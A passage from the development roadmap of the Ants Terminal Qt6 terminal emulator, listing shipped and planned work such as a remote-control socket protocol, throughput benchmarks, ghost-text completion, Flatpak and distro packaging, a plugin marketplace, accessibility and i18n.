  - INV-2: green for `main` / `master` / `trunk`; amber
    otherwise.
  - INV-3: branch chip and visibility pill have equal
    `sizeHint().height()` so they bottom-align.
  Kind: doc-fix style-only / refactor (visual polish, no
  behaviour change). Source: user-2026-04-30. Lanes: MainWindow,
  status bar.

---

## 0.8.0 — multiplexing + marketplace (target: 2026-08)

**Theme:** big new capabilities. This is the "features you'd expect from
a modern terminal" release.

### 🐛 Carried over from 0.7.x

- 💭 [ANTS-1058] **Menubar dropdown flicker on mouse movement.** Partially reduced
  by 0.7.5 (`NoAnimStyle` killed Fusion's 60 Hz `QPropertyAnimation`
  cycle) and the 0.7.5+1 follow-up commit `04f3409` (extended
  intra-action suppression to `HoverMove`/`HoverEnter`/`HoverLeave`).
  Residual flicker still visible to the user on mouse motion over an
  open dropdown. Measured state on 2026-04-20: idle-log event volume
  is clean, but a ~85 Hz `UpdateRequest` → paint cascade persists
  even with `paintEvent()` forced to no-op (`ANTS_SKIP_PAINT=1`) and
  `WA_TranslucentBackground` disabled (`ANTS_OPAQUE_WINDOW=1`),
  which points at KWin's compositor sync handshake driving the
  cycle rather than anything in our widget tree. Likely next-angle
  fixes: (a) request KWin skip the blur-behind effect for our popup
  QMenus (empty `_KDE_NET_WM_BLUR_BEHIND_REGION` property);
  (b) disable `Qt::WA_Hover` on `QMenuBar` while a dropdown is open
  so the style engine stops re-evaluating `:hover` on every cursor
  tick; (c) test under GNOME/Mutter and i3 to confirm KWin is the
  amplifier. Not a blocker (user-reported as "not the biggest issue")
  but tracked so the 0.7.x fix attempts don't get re-invented.

### ⚡ Performance

- 🚧 [ANTS-1059] **Terminal throughput slowdowns** (user report 2026-04-20).
  Intermittent stalls observed during normal use. Investigation items:
  (a) profile `onVtBatch()` under heavy-output workloads — `yes`,
  `dd`, `find /`, build logs — and identify hotspots;
  (b) audit `TerminalGrid::processAction` for O(n) allocations on
  each Print (the hot path);
  (c) check whether the async batch drain ack (`drainAck`) under
  back-pressure is creating producer-consumer sawtooth rather than
  steady flow; (d) measure paint time at 2000+ line scrollback with
  ligatures on vs off; (e) check the focus-redirect lambda and other
  `QApplication::focusChanged` handlers for expensive work per event.
  - ✅ **Benchmark harness.** `tests/perf/bench_vt_throughput.cpp`
    drives four fixed corpora — `ascii_print`, `newline_stream`,
    `ansi_sgr`, `utf8_cjk` — through `VtParser` →
    `TerminalGrid::processAction` at release-level `-O2`, no GUI.
    Emits a CSV line per corpus with bytes, actions, wall-ms,
    MB/s, actions/s. Registered under `ctest` label `perf`
    (excluded from the default `fast` suite). Run with
    `ctest -L perf --verbose` or directly; `ANTS_PERF_MB=64
    ./bench_vt_throughput` for a heavier sweep. **Baseline
    2026-04-20 on the dev laptop (4 MB per corpus):**

    | Corpus | MB/s | Actions/s | Note |
    |--------|-----:|----------:|------|
    | `ascii_print` | 23.3 | 24.4 M | Print-only; UTF-8 fast path |
    | `newline_stream` | 5.3 | 5.6 M | **4× slower — scroll/scrollback hotspot** |
    | `ansi_sgr` | 16.9 | 13.0 M | SGR dispatch |
    | `utf8_cjk` | 7.9 | 3.1 M | 3-byte UTF-8 + double-width |

    Top signal from the baseline: `newline_stream` is 4× slower
    than pure Print, pointing at `lineFeed()` →
    `TerminalGrid::scrollUp()` → scrollback deque insertion as
    the dominant cost. Matches sub-item (b) on the list above —
    next action is a `perf record`/`callgrind` run over
    `newline_stream` to confirm which `scrollUp` sub-step
    dominates (row allocation? per-line combining-char table
    copy? pushBack on the scrollback `std::deque`?).
  - ✅ **Main-thread stall detector** (`DebugLog::Perf`, enabled
    via `ANTS_DEBUG=perf`). 200 ms heartbeat `QTimer` that
    records every drift > 100 ms as a main-thread stall. Added
    after the follow-up user report 2026-04-20: "slow down
    experienced at various times, when tab has been clear or
    has had lots of text, not one specific scenario." The
    intermittent-and-content-independent signature points away
    from the PTY hot path and toward a periodic background
    handler (2 s status-bar `updateStatusBar` reading
    `.git/HEAD`, 2 s Claude-integration `/proc` walk, focus-
    redirect lambda, plugin callback, session save, file-system
    watcher fire). The detector fingerprints which one on the
    next reproduction — log line shape is `STALL: main-thread
    blocked for Nms (gap=..., interval=..., count=..., worst=...)`.
- 📋 [ANTS-1060] **Dynamic grid storage** (Alacritty
  [PR #1584](https://github.com/alacritty/alacritty/pull/1584/files)).
  Don't pre-allocate the full `Vec<Vec<Cell>>` scrollback; lazily
  allocate row buffers; intern empty rows to a single shared sentinel.
  Alacritty's own data: 191 MB → 34 MB (20k-line scrollback).
- 📋 [ANTS-1061] **Async image decoding**. Hand sixel/Kitty/iTerm2 payloads to
  `QtConcurrent::run`; render a placeholder cell until `QImage`
  future resolves. Big sixel frames stop blocking the prompt.
- 💭 [ANTS-1062] **BTree scrollback** — O(log n) scroll-to-line instead of O(n)
  for jump-to-timestamp features.

### 🎨 Features — multiplexing

- 🚧 [ANTS-1063] **Remote-control protocol** (Kitty-style,
  [docs](https://sw.kovidgoyal.net/kitty/rc_protocol/)): JSON envelopes
  over a Unix socket. Commands: `launch`, `send-text`, `set-title`,
  `select-window`, `get-text`, `ls`, `new-tab`. Auth via X25519 when
  a password is set. Unlocks scripting, IDE integration, CI.
  - ✅ **First slice: socket + envelope + `ls`.** `src/remotecontrol.{h,cpp}`
    brings up a `QLocalServer` on `$ANTS_REMOTE_SOCKET` (or the XDG
    runtime default `$XDG_RUNTIME_DIR/ants-terminal.sock`). Each
    connection is one-shot: read a single JSON line, dispatch, write
    the JSON response line, close. `ls` returns
    `{"ok": true, "tabs": [{"index", "title", "cwd", "active"}, ...]}`.
    Unknown commands return `{"ok": false, "error": "unknown command: ..."}`
    with exit code 2. The same binary handles client mode via
    `--remote <cmd>` (optionally `--remote-socket <path>`) — no
    separate client binary. Pinned by source-grep feature test
    `tests/features/remote_control_ls/` (8 invariants including
    field-name stability, env-var override, `--remote` ordering).
  - ✅ **`send-text` command.** Writes a UTF-8 string byte-for-byte to
    a tab's PTY master. `tab` field optional (active tab default),
    `text` required; response carries `bytes` written. Client CLI:
    `--remote-text <str>` or stdin pipe; `--remote-tab <i>` optional.
    Does not auto-append a newline (matches Kitty; callers include
    terminators explicitly). Pinned by
    `tests/features/remote_control_send_text/`.
  - ✅ **`new-tab` command.** Opens a fresh tab and returns its
    0-based index. `cwd` optional (inherits focused-terminal cwd);
    `command` optional (written via `writeCommand` after a 200 ms
    settle). Response: `{"ok":true,"index":<int>}`. Client CLI:
    `--remote-cwd <path>`, `--remote-command <str>`. Pinned by
    `tests/features/remote_control_new_tab/`.
  - ✅ **`select-window` command.** Switches the active tab to the
    0-based index given in the `tab` field (required). Focuses the
    new tab's terminal so follow-up `send-text` without an explicit
    tab lands correctly. Pinned by
    `tests/features/remote_control_select_window/`.
  - ✅ **`set-title` command.** Pins a tab label that survives both
    the per-shell `titleChanged` signal (OSC 0/2) and the 2 s
    `updateTabTitles` refresh. Empty title clears the pin and
    restores from `shellTitle()` (under `tabTitleFormat == "title"`)
    or rebuilds via the format-driven path. Pin freed at tab-close.
    Pinned by `tests/features/remote_control_set_title/`.
  - ✅ **`get-text` command.** Returns trailing N lines of
    (scrollback + screen) joined with `\n`. Default 100, capped
    server-side at 10 000 to bound the JSON envelope. Reuses
    `TerminalWidget::recentOutput()` — same accessor the AI dialog
    uses for context capture, so format stays consistent. Pinned
    by `tests/features/remote_control_get_text/`.
  - ✅ **`launch` command.** Convenience wrapper for `new-tab` +
    `send-text`, sugar for `idx=$(... new-tab) && ... send-text
    --remote-tab $idx ...`. `command` is required (rejects empty
    with a "use new-tab" hint); auto-appends `\n` so the command
    actually runs. Pinned by `tests/features/remote_control_launch/`.
    **Initial command surface complete** — 7/7. Remaining work in
    this item is the X25519 auth layer (currently 💭).
  - 💭 [ANTS-1064] **Auth layer.** X25519 shared-secret when `$ANTS_REMOTE_PASSWORD`
    is set. Shipped after the command surface is complete.
- 📋 [ANTS-1065] **Headless mux server with codec RPC**. WezTerm's architecture
  ([DeepWiki](https://deepwiki.com/wezterm/wezterm/2.2-multiplexer-architecture)):
  `ants-terminal --server` runs without a GUI and accepts attachments
  over a Unix socket; `ants-terminal --attach <socket>` reconnects.
  Panes survive window close. Sparse scrollback fetched on demand via
  `GetLines` RPC.
- ✅ **SSH ControlMaster** auto-integration from the SSH bookmark
  dialog. Shipped in 0.7.1. Connects opened from the SSH Manager
  carry `-o ControlMaster=auto`,
  `-o ControlPath=$HOME/.ssh/cm-%r@%h:%p`, and
  `-o ControlPersist=10m` when the new `ssh_control_master` config
  key is true (default). `$HOME` resolves in-process via
  `QDir::homePath()` so the ControlPath works under dash / POSIX
  `sh`; `%r@%h:%p` are OpenSSH tokens and survive shell quoting
  intact. Second tab to the same host opens in ms instead of
  seconds. See
  [CHANGELOG.md §0.7.1](CHANGELOG.md#071--2026-04-19).
- 💭 [ANTS-1066] **Domain abstraction** à la WezTerm: `DockerDomain` lists
  `docker ps`, opens a tab via `docker exec -it`; `KubeDomain` lists
  pods, opens via `kubectl exec`. Reuses the SSH bookmark UI shell.
- 💭 [ANTS-1067] **Persistent workspaces**: save/restore entire tab+split layout +
  scrollback to disk; one-click "resume yesterday's dev session."

### 🎨 Features — inline ghost-text completion

Claude Code's "as-you-type" completion pattern — you begin typing a
command (e.g. `/ind`), the rest of the best match (`ie-review`) is
shown inline in a dim/greyed color, and TAB commits it. This is
separate from a popup/dropdown picker — it's inline with the cursor,
zero-click, purely suggestive. Proposed in two scopes:

- ✅ **Command Palette ghost-completion (near-term, small scope).**
  Shipped 0.7.42. New `GhostLineEdit` subclass of `QLineEdit`
  (declared in `src/commandpalette.h`) overrides `paintEvent` to
  draw the unmatched suffix of the top fuzzy-match at
  `cursorRect().right() + 1` in `palette().color(QPalette::Text)`
  with `setAlphaF(0.45)` — matches the design contract
  `palette[fg] * 0.45 alpha` exactly. `populateList` calls a new
  `updateGhostCompletion(filter)` that picks the top item, recovers
  the underlying `QAction`, and (only for case-insensitive prefix
  matches) sets the ghost to `name.mid(filter.length())`.
  `contains()`-only matches get an empty ghost since the suffix
  visual contract only makes sense flush after the user's input.
  `Tab` is wired to `commitGhost()`, which appends the ghost to the
  input via `setText`; the post-commit text equals the visible
  composition (user-typed prefix + ghost suffix), preserving
  user-typed casing on commit (shell-completion semantics). `Tab`
  does not also execute — `Enter` runs, matching Claude Code's
  `/slash`-completion contract. Tab is always consumed by the
  palette so focus cannot leave the input while it is open. Locked
  by `tests/features/command_palette_ghost_completion/` (ten
  invariants); pre-fix verification: with `commandpalette.{h,cpp}`
  stashed, the test fails to even compile (missing `GhostLineEdit`
  symbol). The in-terminal shell ghost-suggestion (`💭` below)
  remains separate scope — different surface, different data
  source.
- 💭 [ANTS-1068] **In-terminal shell ghost-suggestion (fish-shell style, bigger
  scope).** As the user types at the shell prompt, ghost-suggest
  from shell history — fish's killer UX feature. Requires two
  pieces: (a) prompt detection (OSC 133 already provides this —
  `A`/`B`/`C` markers bracket the command line), (b) a history
  source. Two options:
    - *Zero-shell-integration*: scrape `$HISTFILE` via inotify on
      `~/.bash_history` / `~/.zsh_history` / `~/.local/share/fish/fish_history`.
      Cross-shell, no user setup, but lags (history flushes on shell
      exit for bash/zsh).
    - *OSC-bridged*: introduce a new OSC payload
      (`OSC 133 ; D ; <command> ST` or similar) emitted by a shell
      plugin (shipped alongside Ants for bash/zsh/fish). Near-realtime,
      but requires shell-side setup.
  Render the ghost suggestion inline (rightward from the cursor) by
  injecting it into the terminal's own cursor-row painting — gated
  on OSC 133 A (we know we're on a prompt line), cleared on A again
  or on PTY output (user's shell re-printing over it).
  Non-trivial — touches `terminalgrid.cpp` paint path, `vtparser.cpp`
  (new OSC dispatch if shell plugin ships), new config keys
  (`ghost_completion_enabled`, `ghost_completion_source`). Defer to
  beyond 1.0 unless users ask.
- 💭 [ANTS-1069] **Frequency-ranked completion source.** Either form benefits
  from "show the most-used match first, not just the alphabetically-
  first match." The Command Palette could track selection counts;
  the terminal form can lean on shell history ordering. Worth a
  mention but not a blocker for the initial implementation.

### 📦 Distribution readiness (H5–H7, H13)

Mid-term packaging work — this is where Ants moves from
"packageable-in-theory" to "actually installable on every major
distro." Each sub-bullet can ship independently once H1–H4 land.

- ✅ **H5 — ready-to-submit distro packaging files**. Shipped in
  0.6.20. Each recipe drives the existing CMake install rules with
  zero source patches and runs the audit-rule regression suite in
  its own test stage:
  - `packaging/opensuse/ants-terminal.spec` — openSUSE RPM spec
    targeting Tumbleweed. Uses core macros (`%cmake`,
    `%cmake_build`, `%cmake_install`, `%ctest`, `%autosetup`) so
    the file is close to portable to Fedora. BuildRequires
    declared via `cmake(Qt6*)` pkgconfig-style entries; `%files`
    enumerates all fifteen install paths explicitly so a missing
    artefact fails the OBS build instead of producing a
    silently-incomplete package. Submit via OBS to
    `devel:languages:misc` or a dedicated project; changelog lives
    in a separate `.changes` file per openSUSE convention.
  - `packaging/archlinux/PKGBUILD` — Arch AUR release recipe
    (`ants-terminal`). `check()` runs ctest; built against system
    Qt6 and lua. `sha256sums=('SKIP')` in-tree with a comment
    pointing packagers at `updpkgsums` once the upstream tag is
    live. The `-git` rolling variant is documented in
    `packaging/README.md` (three-line diff: `pkgname`, `source`,
    `pkgver()`).
  - `packaging/debian/` — `control`, `rules`, `changelog`,
    `copyright`, `source/format`. `debhelper-compat 13` drives
    `dh $@ --buildsystem=cmake` with Ninja as the backend; DEP-5
    `copyright` carries the full MIT license text;
    `DEB_BUILD_MAINT_OPTIONS = hardening=+all` stacks
    dpkg-buildflags' hardening wrappers on top of our CMake
    hardening flags. Suitable for `debuild -uc -us` or a Launchpad
    PPA; eventual target is ITP → official archive.
  - `packaging/README.md` — one-page build / submission guide for
    all three recipes.

  See [CHANGELOG.md §0.6.20](CHANGELOG.md#0620--2026-04-15).
- ✅ **H6 — Flatpak packaging**. Shipped in 0.7.2.
  `packaging/flatpak/org.ants.Terminal.yml` against
  `org.kde.Platform//6.7` (KDE SDK brings cmake/ninja/Qt6). The PTY
  path in `src/ptyhandler.cpp` detects `FLATPAK_ID` /
  `/.flatpak-info` in the forked child and exec's the user's shell
  via `flatpak-spawn --host` with explicit
  `--env=TERM/COLORTERM/TERM_PROGRAM/TERM_PROGRAM_VERSION/COLORFGBG`
  and `--directory=<workDir>` — the only workable PTY model inside a
  sandbox (same pattern Ghostty's Flathub build uses). `finish-args`
  cover Wayland/X11/DRI, network (AI endpoint + SSH), portals
  (global shortcuts), desktop notifications, and XDG config/data
  directories. Source-grep feature test
  (`tests/features/flatpak_host_shell/`) pins the branch shape:
  detection probes both signals in an OR, `--host` + `--`
  separators, every TERM var passes through as `--env=`, workDir
  gates on `isEmpty()`, direct-exec fallback is preserved verbatim.
  Lua plugins disabled in the initial manifest — `org.kde.Sdk`
  doesn't ship lua54 and tarball-sha256 refresh per release is a
  maintenance cost worth deferring; plugin support returns via a
  `shared-modules` Lua entry in a follow-up (H6.1 below). Flathub
  submission is the final step — manifest is ready to re-point
  `sources[].type: dir` → `git / url / tag` and PR against
  [flathub/flathub](https://github.com/flathub/flathub) (H6.2
  below). See [CHANGELOG.md §0.7.2](CHANGELOG.md#072--2026-04-19)
  and [packaging/flatpak/README.md](packaging/flatpak/README.md).
- ✅ **H6.1 — Lua plugins in Flatpak**. Shipped in 0.7.3. The
  manifest now carries an in-manifest Lua 5.4 `archive` module
  before `ants-terminal`, built from
  `https://www.lua.org/ftp/lua-5.4.7.tar.gz` with a pinned
  `sha256` and the `linux-noreadline` target (Ants only links
  `liblua.a` statically; readline would be bloat in the sandbox).
  `MYCFLAGS="-fPIC"` keeps the library PIE-safe for linking into
  the `ants-terminal` executable; installed to `/app` via
  `make install INSTALL_TOP=/app`, where CMake's `FindLua`
  searches by default. The `x-checker-data` stanza on the module
  is wired to
  [flatpak-external-data-checker](https://github.com/flathub/flatpak-external-data-checker)
  so Flathub CI auto-refreshes the `url` + `sha256` on each Lua
  5.4.x point release — no manual hash churn, and 5.5.x majors
  are excluded (they would break the in-source
  `find_package(Lua 5.4)` floor). `tests/features/flatpak_lua_module/`
  pins six invariants against the manifest YAML (module order,
  pinned sha256, `-fPIC`, install prefix, readline-free target,
  x-checker-data stanza). The `flathub/shared-modules` path
  remains the cleaner long-term home if Flathub ever accepts a
  Lua 5.4 entry — migration would replace the in-manifest module
  with a shared-modules reference; `x-checker-data` would
  continue to fire. See
  [CHANGELOG.md §0.7.3](CHANGELOG.md#073--2026-04-20).
- 📋 [ANTS-1070] **H6.2 — Flathub submission**. PR a new repo against
  [flathub/flathub](https://github.com/flathub/flathub) named
  `org.ants.Terminal`. In-tree prep is complete: the
  `<screenshots>` block in
  `packaging/linux/org.ants.Terminal.metainfo.xml` now points at three
  captures under `docs/screenshots/` so Flathub's store tile renders
  with real UI (main terminal + Review Changes dialog + Project Audit
  panel), and `packaging/flatpak/make-flathub-manifest.sh` + a feature
  test pin the transformation from the dev manifest
  (`type: dir / path: ../..`) to the Flathub manifest
  (`type: git / url: https://github.com/milnet01/ants-terminal /
  tag: v<version>`) so there is one source of truth for the manifest.
  Submission playbook lives at
  [packaging/flatpak/FLATHUB.md](packaging/flatpak/FLATHUB.md).
  Remaining blocker is real-user shakedown of the v0.7.3 Flatpak —
  wait for a small cohort to exercise the host-shell + plugin build
  before claiming the Flathub repo name. Once the PR merges, Flathub
  CI rebuilds on each new `v<version>` tag — no manual work per
  release, only per-bump regeneration of the tag-pinned manifest
  (one script invocation). On landing, flip the "gating item 1: no
  distro packages anywhere" entry in the
  [Distribution-adoption overview](#distribution-adoption-overview)
  from "H5 + H6 unblock this" to "unblocked".
- 📋 [ANTS-1071] **H7 — project website + docs site**. Static GitHub Pages site
  at `ants-terminal.github.io` (or equivalent) with: screenshots,
  installation instructions (once H5/H6 land), plugin authoring
  guide (move `PLUGINS.md` body here, keep the file as a pointer),
  quickstart, architecture overview, video/asciicast demos.
  Content-as-code (markdown → static site generator) so the docs
  ship from the same repo.
- 📋 [ANTS-1072] **H13 — distro-outreach launch**. Once H1–H7 are shipped:
  file **intent-to-package** bugs / RFPs in Debian / Fedora /
  NixOS / openSUSE / Arch (as applicable); write a
  **"Why Ants Terminal"** post for r/linux, Hacker News, Phoronix
  tip line, LWN. Focus angle: **the only Linux terminal with a
  built-in capability-audited Lua plugin system + AI triage +
  first-class shell-integration blocks**. Measure via watching
  the GitHub stars + install metrics, not vanity.

### 🔌 Plugins — marketplace

- 📋 [ANTS-1073] **Signed plugin packaging**: Ed25519 sig over a tarball containing
  `init.lua`, `manifest.json`, and optional assets. Loader verifies
  against a project-maintained keyring + (optionally) user-added keys.
- 📋 [ANTS-1074] **Public marketplace index**: static JSON hosted on GitHub Pages
  listing name, version, author, signature-status, permission summary.
  Settings → Plugins → Browse lists them with an install button.
- 📋 [ANTS-1075] **Plugin dependency resolution**: `manifest.json` `requires: [...]`
  field; install flow resolves transitively.

### 🖥 Platform

(See the 📦 Distribution readiness section above for the Flatpak +
source-package packaging work; items that don't fit there live
here.)

---

## 0.9.0 — platform + a11y (target: 2026-10)

**Theme:** reach new users. Port, accessibility, internationalization.

### 🖥 Platform

- 📋 [ANTS-1076] **H8 — macOS port**. Qt6 ports cleanly; replace `forkpty` with
  `posix_spawn` + `openpty`, swap `xcbpositiontracker` for
  `NSWindow` KVO observers, sign+notarize the `.app`. Expands the
  addressable audience — a terminal that only runs on Linux is not
  a "Linux terminal project", it's a "Linux-only terminal" —
  distinction matters for cross-platform press coverage.
- 💭 [ANTS-1077] **H12 — Windows port**. ConPTY via `CreatePseudoConsole`
  replaces PTY; `xcbpositiontracker` becomes a no-op. Qt6's
  Windows platform plugin handles the rest. Sign + ship MSI /
  MSIX. Moved to Beyond 1.0 in practice — gating on macOS port
  completing first.

### 🖥 Accessibility

- 📋 [ANTS-1078] **H9 — AT-SPI/ATK support**. Qt6 has AT-SPI over D-Bus natively.
  Work: implement `QAccessibleInterface` for `TerminalWidget`
  exposing role `Terminal`; fire `text-changed` / `text-inserted`
  on grid mutations (gate on OSC 133 `D` markers to batch); expose
  cursor as caret
  ([freedesktop AT-SPI2](https://www.freedesktop.org/wiki/Accessibility/AT-SPI2/)).
  Without this, Orca reads nothing in the terminal. Ubuntu /
  Fedora accessibility review gates on this.
- 💭 [ANTS-1079] **Screen-magnifier-friendly rendering**: honor
  `QGuiApplication::styleHints()->mousePressAndHoldInterval()` and
  provide high-contrast theme variants.

### 🌍 Internationalization

- 📋 [ANTS-1080] **H10 — i18n scaffolding**. Qt's `lupdate` / `linguist` flow;
  wrap all UI strings with `tr()`; ship `.qm` files in
  `assets/i18n/`. Today we have zero `tr()` usage. Start with
  English → Spanish, French, German as a proof of concept. Some
  distros gate review on this.
- 💭 [ANTS-1081] **Right-to-left text support** — bidirectional text in the grid.
  Non-trivial; defer until demand is concrete.

### 📦 Distribution readiness (H11)

- 💭 [ANTS-1082] **H11 — reproducible builds + SBOM**. Build under
  `SOURCE_DATE_EPOCH` so binary hashes are deterministic; generate
  an SPDX SBOM (`spdx-tools` or `syft`) alongside release
  artifacts. Reproducibility is a distro / supply-chain trust
  signal; the SBOM gives downstream security teams (Debian,
  NixOS) a machine-readable dep inventory without having to scrape
  our build system.

### 🧰 Dev experience

- 📋 [ANTS-1083] **Plugin development SDK**: `ants-terminal --plugin-test <dir>`
  runs a plugin against a mock PTY with scripted events. Enables
  unit-testing plugins.

---

## 1.0.0 — stability milestone (target: 2026-12)

**Theme:** API freeze. No new features; quality, docs, migration guide.

- 📋 [ANTS-1084] **`ants.*` API stability pledge**: the 1.0 surface won't break in
  `1.x` minor releases. Breaking changes queue for 2.0.
- 📋 [ANTS-1085] **Performance regression suite**: CI benchmarks (grid throughput,
  scrollback allocation, paint-loop time) with commit-level deltas.
- 📋 [ANTS-1086] **Documentation pass**: every user-facing feature has at least one
  screenshot + one animated demo. Rolls up into H7 (docs site).
- 📋 [ANTS-1087] **External security audit**. `SECURITY.md` disclosure policy
  itself ships early under H1 (0.7.0); the 1.0 item is the
  **external** audit — budget a third-party review of the VT
  parser, plugin sandbox, and OSC-8/OSC-52 surfaces before
  stamping 1.0.
- 📋 [ANTS-1088] **H14 — bus factor ≥ 2 + governance doc**. Second maintainer
  with commit rights; a short `GOVERNANCE.md` describing
  decision-making, release process, conflict resolution. Distros
  treat single-maintainer projects as a risk — a documented
  second maintainer clears the bar.
- 📋 [ANTS-1089] **Plugin migration guide** for any manifest/API changes between
  0.9 and 1.0.

---

## Beyond 1.0 — long-horizon

These are far enough out that specifics will change. Captured here so
contributors don't duplicate research.

### 🔌 Plugins

- 💭 [ANTS-1090] **WebAssembly plugins** via `wasmtime` or `wasmer`. Same `ants.*`
  API exposed as WASI imports. Lua plugins continue to work — WASM is
  additive for authors who want Rust/Go/AssemblyScript. Stronger
  sandbox than Lua's removed-globals model; language-agnostic. Ghostty
  is experimenting with a WASM-targeting VT library today.
- 💭 [ANTS-1091] **Inter-plugin pub/sub**: `ants.bus.publish(topic, data)` /
  `ants.bus.subscribe(topic, handler)`. Needs careful permission
  modeling — a "read_bus: <topic>" capability.

### 🎨 Features

- 💭 [ANTS-1092] **AI command composer** (Warp-style). Dialog over the prompt
  accepts natural language, returns a shell command + explanation.
  Uses the existing OpenAI-compatible config; opt-in per invocation.
- 💭 [ANTS-1093] **Collaborative sessions**: real-time shared terminal with a
  second user via an end-to-end encrypted relay. The "share
  terminal with a colleague" feature tmate popularized.
- 💭 [ANTS-1094] **Workspace sync**: mirror `config.json`, plugins, and SSH
  bookmarks across devices via a user-configurable git remote.

### 🔒 Security

- 💭 [ANTS-1095] **Confidential computing**: run the PTY in an SGX/SEV enclave,
  with the renderer as the untrusted host. Meaningful for people who
  type secrets into the terminal — every keystroke lives only in
  enclave memory until it's shown on-screen. Heavy lift; benefit
  concentrated in a small user set.

### ⚡ Performance

- 💭 [ANTS-1096] **GPU text rendering with ligatures**. Today GPU path can't
  render ligatures (HarfBuzz shaping is on the CPU path). Port the
  shaping step to a compute shader; keep the atlas path we already
  have.

### 📦 Distribution & community (H15–H16)

- 💭 [ANTS-1097] **H15 — conference presence**. FOSDEM lightning talk or a
  devroom slot (the Linux desktop devroom is where distro
  maintainers converge). Other options: LinuxFest Northwest,
  Everything Open, SCaLE. One talk reaches more maintainers than
  a hundred issues. Submit in the CFP window for whatever
  conference the project is scope-ready for at the time.
- 💭 [ANTS-1098] **H16 — sponsorship / funding model**. GitHub Sponsors + Open
  Collective. Even small recurring funding signals project
  longevity to distro security teams (they care about "who pays
  for the 30-day CVE response?"). Tiered: individual ($5/mo),
  plugin-author ($20/mo with logo on docs site), corporate
  ($250/mo with logo + priority issue triage).

---

## How to propose a roadmap item

Open a GitHub issue with:

1. **What**: one-sentence description of the capability or change.
2. **Why**: concrete user problem it addresses. Link to the source
   (forum post, issue, personal story) if possible.
3. **Prior art**: has another terminal solved this? Which one, how?
   Link the source.
4. **Scope hint**: is this a weekend change, a week, or a month?
5. **Category**: which theme (🎨/⚡/🔌/🖥/🔒/🧰/📦) does it belong to?

Items that fit naturally into the current release arc land in that
release. Items that don't get queued here with a 💭 marker until
the scope clarifies.

**A roadmap item is not a commitment.** It's a record that we thought
about it, found the prior art, and believe it fits the product. Scope
changes with bandwidth and real-world feedback. Check the
[CHANGELOG.md](CHANGELOG.md) for what actually shipped.
